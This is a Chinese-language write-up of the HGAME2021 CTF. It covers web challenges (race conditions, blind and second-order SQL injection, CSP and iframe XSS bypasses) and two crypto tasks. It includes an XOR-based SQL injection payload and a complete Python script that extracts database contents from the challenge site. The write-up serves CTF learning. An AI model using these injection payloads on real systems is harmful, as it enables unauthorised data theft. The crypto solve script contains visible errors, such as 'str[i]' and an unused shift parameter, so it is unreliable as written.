# HGAME2021 - 梦的开始

## WEB

## 0x01 200OK!

参考链接:https://blog.csdn.net/anwen12/article/details/113728065

#### 0x02 LazyDogR4U  

一个简单的代码审计类的问题

![image-20210224205004441](https://i.loli.net/2021/02/24/Jmzfr8nWXeCoGy7.png)

这是提示

![image-20210224205014837](https://i.loli.net/2021/02/24/g4vrxbpSl3qsFwn.png)

这里请不要像沙雕的博主一样，将简单的替换为空，理解为需要找寻其他的系统变量，因为所有的变量都已经被制空了。至于需要一个已经登陆的账号，0e的MD5绕过大可不必再说。

#### 0x03 LIKI的生日礼物

题目的初步探索，没有注入，没有购买逻辑漏洞，有的只有**竞争**（可以理解为，系统还没来得及扣钱，就已经先把东西发给你了，这样我就可以蹭着余额没有被清空，继续购买）

#### 0x04 Liki-Jail  

SQL时间盲注，绕过引号

```
SELECT * FROM `u5ers` WHERE `usern@me`='$username' and `p@ssword`='$password'
```

然后 使用**\\**去逃逸，就可以了。

这里有个问题，那就是select的时候，从表中拿出数据，最后能够在指出表的时候，前面加上数据库，不要问我为什么，**调了一天payload的苦你不懂**。

#### 0x05 Post to zuckonit 2.0  

这个题目属实是没有做出来，正则表达式过滤的含义，被我搞错了。

那个题目中有一个CSP的头部，这样来分析一下。

⾮同域的 js 代码，都不能执⾏，任何注⼊的⾏内 js （即 unsafe-inline ）也不能执⾏。  唯一的绕过方式就只有iframe标签，这样我们也就可以顺理地推出，这道题的题点在于那个iframe标签的过滤位置，这样我接着向下打。

首先提出那个正则表达式的含义

```
<iframe src='8个字符'>
```

这样的标签不会被过滤。然后再加上CSP头，我们就知道，要想在主页面执行js代码，那和做梦有什么区别呢？所以我们就可以审视一下那个神奇的**preview**界面，我们来看看WP的非预期解答。

**非预期一**

![image-20210224210831318](https://i.loli.net/2021/02/24/2krO67lisY3fqZJ.png)

直接闭合**"**来填入任意格式的js代码，那样都可以被执行。

**非预期二**

同理，既然我可以替换，那么我直接把iframe标签整个替换掉，该注释的注释，这就又是一个任意带码的插入问题了。

#### 0x06 Post to zuckonit another version  

![image-20210224211304394](https://i.loli.net/2021/02/24/kxl3TqsitUWzpwc.png)

这里根据赛题的提示https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace

我们假设看懂了提示，继续做题。

![image-20210224211417932](https://i.loli.net/2021/02/24/xI6liFkYgpyahjv.png)

![image-20210224211731788](https://i.loli.net/2021/02/24/mih6y2nDGUXkpOV.png)

因为其实就考察了一个对于正则表达式熟悉程度的理解，怎样才能够插入，我们自己的数据呢？**|**两边只需要匹配上一边就可以继续，所以一边放匹配，一边放插入的字符串，问题就解决了。

#### 0X07 Unforgettable

这个题目是一个二次注入，不是SSTI，辣鸡（switch爷爷，我错了

这个题的官方题解就不好说了，一个时间盲注，username是注入点，user的路由是二次注入触发的地方。这里主要说一下，一个更骚的解法（**Carrot2师傅太骚了**。因为在这里是有回显的，有回显的，有回显的。所以我们可以先注册，1-127的用户。然后利用异或注入

```
0'^ord(reverse(left(({}),{})))#{}".format(evsql, i, ran)
```

这个语句就会一位一位的把亲爱的数据那出来和0异或，异或的结果是什么呢？当然就是他自己了，这不就是那一位字符的ascii码吗？然后的然后，我们就可以上脚本了。

```
import requests
import random
import time,re

'''
session = requests.session()
evsql = "select database()"
for i in range(0, 127):
    time.sleep(0.3)
    ran = random.randint(1000000, 999999999)
    burp0_url = "https://unforgettable.liki.link/register"
    burp0_data = {"username": "{}".format(i),
                  "email": "{}@qq.com".format(ran), "password": "admin", "submit": "注册"}
    r = session.post(burp0_url,data=burp0_data)
    if "You have registered!" not in r.text:
        if "Invalid Username" in r.text:
            continue
        else:
            # print(r.text)
            print(i,"注册失败")
            # exit()
            
'''
#evsql = "select/**/group_concat(table_name,',')/**/from/**/information_schema.tables/**/where/**/table_schema/**/regexp/**/database()"
#database todolist
# ffflllaagggg,,todolist,,user,,,
#evsql = "select/**/group_concat(COLUMN_NAME,',')/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME/**/regexp/**/'fflllaagggg'"
evsql  = "select/**/ffllllaaaagg/**/from/**/ffflllaagggg"
def register(s,payload,ran):
    url = "https://unforgettable.liki.link/register"
    burp0_data = {"username": payload,
                  "email": "{}@qq.com".format(ran), "password": "admin", "submit": "注册"}
    s.post(url,data=burp0_data)
    return s

def login(s,ran):
    url = "https://unforgettable.liki.link/login"
    burp0_data = {"email": "{}@qq.com".format(ran), "password": "admin", "submit": "登录"}
    s.post(url,data=burp0_data)
    return s

def finda(s):
    url = "https://unforgettable.liki.link/user"
    text = s.get(url).text
    res = re.findall('<h4 class="modal-title" id="myModalLabel" align="center">Username: (.*?)</h4>',text,re.S)[0]
    return res
def run():
    session = requests.session()
    ran  = random.randint(1000000, 999999999)
    table_name = ''
    for i in range(1,32):
        ran  = random.randint(1000000, 999999999)
        payload = "0'^ord(reverse(left(({}),{})))#{}".format(evsql, i, ran).replace(' ', '\t')
        s = register(session,payload,ran)
        s = login(s,ran)
        a = finda(s)
        table_name += chr(int(a))
        print(table_name)
    print(table_name)
        
run()
```



## Cry

#### 0x01 signin

如果p是一个质数，而整数a不是p的倍数时，下面的等式变换成立：

![image-20210224221602808](https://i.loli.net/2021/02/24/pRmlzYXUFS4WEQ8.png)

```
gmpy2.invert(a, p) 这是用来求逆元的函数
```

#### 0x02  password

题目大概长这个样子

![image-20210224231815758](https://i.loli.net/2021/02/24/l95AWh3bqIEPgyt.png)

就是一个数字，将他左位移，然后又右位移得到的三个新数，直接做异或，所得到的结果，是我们可以知道的。这个时候来求解x。

![image-20210224231929563](https://i.loli.net/2021/02/24/gpSWF753vN4HtXU.png)

其实可以简单的看成是这种形式，现在我们知道了y，A是对角矩阵进过变换之后得到的，然后来求解x的题目。然后因为题目本身是异或，简单的想到（GF(2)域上的异或相当于加，乘法相当于与）

给出莎莎师傅的脚本

```
from sage.all import *
from Crypto.Util.number import *


def getM(l,r):
    M = Matrix(GF(2),64)
    for i in range(64):
        M[i, (i-1)%64] = 1
        M[i, (i+r)%64] = 1
        M[i,i] = 1
    return M
def To_vec(a):
    v = vector(GF(2),64)
    for i in range(63,-1,-1):
        if a&1:
            v[i] = 1
        else:
            v[i] = 0
    return v
y = [0] * 8
n = [0] * 8
(y[1],n[1]) = (15789597796041222200,14750142427529922)
(y[2],n[2]) = (8279663441787235887,2802568775308984)
(y[3],n[3]) = (9666438290109535850,15697145971486341)
(y[4],n[4]) = (10529571502219113153,9110411034859362)
(y[5],n[5]) = (8020289479524135048,4092084344173014)
(y[6],n[6]) = (10914636017953100490,2242282628961085)
(y[7],n[7]) = (4622436850708129231,10750832281632461)
shift =[(3,7),(9,4),(5,2),(13,6),(-16,8),(7,5),(5,2)]
flag=b''
for i in range(1,8):
    y[i] ^= n[i]
    temp = To_vec(y[i])
    l,r = shift[i-1]
    M = getM(l,r)
    flag += long_to_bytes(int(''.join([str[i] for i in M.solve_left(temp)]),2))
print(flag)
```

这道题完结散花（补一下数论吧，求求你了。